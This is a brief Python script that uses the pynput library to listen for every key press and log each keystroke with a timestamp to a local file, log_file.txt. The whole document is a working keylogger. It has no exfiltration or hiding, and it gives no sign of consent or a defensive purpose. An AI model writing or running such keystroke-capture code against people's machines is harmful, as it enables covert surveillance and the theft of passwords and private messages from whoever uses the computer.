# Keystroke event listener modules in python
from pynput.keyboard import Key, Listener
import logging

#Prints keystrokes to file named: log_file.txt
logging.basicConfig(filename=("log_file.txt"), level=logging.DEBUG,
                    format='%(asctime)s: %(message)s') 

#Initiates event listener
def press_key(key):
  logging.info(str(key))

with Listener(on_press = press_key) as eventListener:
  eventListener.join()
